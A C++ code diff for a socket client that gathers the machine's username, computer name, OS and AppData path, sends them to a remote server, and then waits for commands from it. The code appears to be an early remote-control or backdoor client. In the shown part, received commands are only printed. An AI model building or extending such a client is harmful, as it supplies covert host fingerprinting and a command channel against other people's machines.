@@ -6,8 +6,6 @@ std::string computer = getenv("computername");
 std::string appdata = getenv("appdata");
 std::string operatingSystem = getenv("os");
 
-std::string command;
-
 //
 void Client()
 {
@@ -54,7 +52,7 @@ void Client()
     string userInput;
 
     // Send data PC
-    string pc = username + " " + computer + " " + operatingSystem + " " + appdata;
+    string pc = " " + username + " " + computer + " " + operatingSystem + " " + appdata + " ";
 
     send(sock, pc.c_str(), pc.size() + 1, 0);
 
@@ -71,17 +69,17 @@ void Client()
         }
 
         //
-        command = string(buf, 0 , bytesReceived);
+        string command = string(buf, 0 , bytesReceived);
 
         //
-        if (command == "Test")
+        if (command == string("-Test"))
         {
-            string msg = "Text";
-            send(sock, msg.c_str(), msg.size() + 1, 0);
+            string test = "TEST228\n";
+            cout << test;
         }
         else
         {
-            cout << "None Command";
+            cout << command;
         }
     }
 
